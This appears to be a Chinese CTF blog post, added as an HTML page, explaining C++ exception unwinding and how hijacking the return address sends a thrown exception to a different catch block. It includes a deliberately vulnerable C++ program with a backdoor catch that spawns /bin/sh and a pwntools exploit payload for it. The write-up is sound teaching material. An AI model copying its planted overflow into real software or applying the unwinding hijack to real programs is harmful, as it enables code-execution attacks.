@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>c++异常机制探究 | Mr.BW的blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">c++异常机制探究</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">三月 26, 2025&nbsp;&nbsp;19:26:04</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="c-异常机制"><a href="#c-异常机制" class="headerlink" title="c++异常机制"></a>c++异常机制</h1><p>c++中<code>try catch</code>模块用于处理异常，程序会去执行try中的代码，如果try中没有throw一个对象，那么会跳过后续的catch，继续执行。如果throw了一个对象，程序会尝试往下去寻找对应的catch去接收这个对象，然后执行该catch中的代码</p>
+<p>关于catch的机制，如果try中尝试进行函数嵌套使用，如果在子函数中进行了throw，那么他会中断当前运行去寻找相应的catch。</p>
+<ul>
+<li>寻找catch首先会在当前函数下文去寻找，如果没找到就去母函数中的下文去寻找</li>
+<li>如果程序没有处理该对象的对应的catch，程序直接退出</li>
+</ul>
+<h2 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h2><h2 id="栈恢复"><a href="#栈恢复" class="headerlink" title="栈恢复"></a>栈恢复</h2><p>正如上文中提到，寻找catch会去母函数中寻找，当前代码不在继续执行。这时程序会进行栈的恢复。</p>
+<p>由于rbp寄存器的特性会去保存函数调用栈地址，因此对栈的恢复本质就是对rbp的恢复。</p>
+<p>栈的恢复过程简单来说如下</p>
+<p><code>rbp&lt;--address1&lt;--address2&lt;--data</code>&#x3D;&gt;&gt;<code>rbp&lt;--address2&lt;--data</code></p>
+<h2 id="回收栈空间"><a href="#回收栈空间" class="headerlink" title="回收栈空间"></a>回收栈空间</h2><p>程序会调用cleanup去回收栈空间</p>
+<p><img src="/../image/c%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/1.png" alt="1"></p>
+<p>这里是编译器加上的代码，在c++中并没有直接的显示对clean的调用。</p>
+<p>这里还包含主动调用析构函数去回收定义在该函数中的对象</p>
+<h2 id="寻找catch块"><a href="#寻找catch块" class="headerlink" title="寻找catch块"></a>寻找catch块</h2><p>上图的cleanup()中的<code>_Unwind_Resume</code>会去栈空间上去寻找catch块。漏洞点的利用也是出现在这里</p>
+<p>若有两个<code>catch(class A)</code>如果程序throw一个A，那么默认情况下会去向下去寻找对应的catch，然后恢复栈。</p>
+<p>如果控制了ret，到另外一个catch中，那么执行完throw后会去执行另一个catch中的代码，而不是本身要去执行的代码。</p>
+<p>eg 伪代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"> funcA()</span><br><span class="line">&#125;</span><br><span class="line">catch (Class A)</span><br><span class="line">&#123;#1</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line"> vuln()</span><br><span class="line">&#125;</span><br><span class="line">catch(Class A)&#123;#2</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">catch(class B)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">vuln()&#123;throw A&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在执行完vuln后理论上回去执行#2catch中的代码，如果劫持了vuln中的ret就会去执行#1中的catch代码。</p>
+<p>这里的ret的地址一般为#1catch对应try结束位置+1</p>
+<p><img src="/../image/c%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/2.png" alt="2"></p>
+<p>如图，如果想要去执行0x401299中的catch，那么ret的地址要设置成 0x401292+1。（这里尝试+1+2+3均可，但大多数都是+1）</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exception.cpp</span></span><br><span class="line"><span class="comment">// g++ exception.cpp -o exc -no-pie -fPIC</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We have never called this backdoor!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span> *s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Backdoor has catched the exception: %s\n&quot;</span>, s);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">x</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="built_in">x</span>(<span class="type">void</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;x:x() called!\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">x</span>(<span class="type">void</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;x:~x() called!\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x tmp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] enter your input:&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0x100</span>;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="built_in">read</span>(<span class="number">0</span>, tmp.buf, count);</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0x10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;Buffer overflow.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] input() return.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">input</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------\n&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">int</span> x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Int: %d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span> *s)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] String: %s\n&quot;</span>, s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] main() return.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开启canary，关闭PIE</p>
+<h2 id="ida与原码对比"><a href="#ida与原码对比" class="headerlink" title="ida与原码对比"></a>ida与原码对比</h2><h3 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h3><p><img src="/../image/c%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/3.png" alt="3"></p>
+<p>会先分配一个exception，然后再把exception对应到要throw的类，最后再抛出</p>
+<p>而在原码中显示为<code>throw &quot;Buffer overflow&quot;</code></p>
+<p>同样的，throw 1也是对应着三行</p>
+<h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try_catch"></a>try_catch</h3><p>catch部分在ida中的伪代码是不显示的，因为他默认程序不会触发throw，而在汇编部分则会清楚的显示</p>
+<p>其次关于try，如main中的try，在ida的main中会显示一遍，在input中还会再显示一遍，实则两个try对应着一个</p>
+<h3 id="代码顺序"><a href="#代码顺序" class="headerlink" title="代码顺序"></a>代码顺序</h3><p>如上文，原码的顺序是try catch 其他代码。而编译器会把catch的部分放在函数最后</p>
+<p>catch在汇编中不是catch，而是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401461                 cmp     rdx, 1</span><br><span class="line">.text:0000000000401465                 jz      short loc_401475</span><br><span class="line">.text:0000000000401467                 cmp     rdx, 2</span><br><span class="line">.text:000000000040146B                 jz      short loc_4014A2</span><br><span class="line">.text:000000000040146D                 mov     rdi, rax        ; struct _Unwind_Exception *</span><br><span class="line">.text:0000000000401470                 call    __Unwind_Resume</span><br></pre></td></tr></table></figure>
+
+<p>去寻找对应的代码</p>
+<p><img src="/../image/c%E5%BC%82%E5%B8%B8%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/4.png" alt="4"></p>
+<p>编译器在catch中也加入try和cleanup来回收资源</p>
+<h2 id="具体执行"><a href="#具体执行" class="headerlink" title="具体执行"></a>具体执行</h2><p>首先在input函数中有一个明显的栈溢出漏洞，利用该漏洞覆盖ret的地址为backdoor的try末尾地址+1即可</p>
+<p>注意由于要恢复栈，因此rbp的地址要设置成一个前后可写的位置，否则就会段错误</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;[!] enter your input:&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x30</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x404000</span>+<span class="number">0x50</span>)+p64(<span class="number">0x401299</span> - <span class="number">2</span>)</span><br><span class="line">gdb.attach(r,<span class="string">&quot;b *0x4013da&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-284745.htm">原创]分享一次 C++ PWN 出题经历——深入研究异常处理机制-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1eE421L7ZE/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=2b1e3ebf48a28efe0fce1107e674ad46">DASCTF X GFCTF 2024四月-pwn-control【异常机制】_哔哩哔哩_bilibili</a></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/03/21/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97%E6%A8%A1%E5%9E%8BBSP/">并行计算模型BSP</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
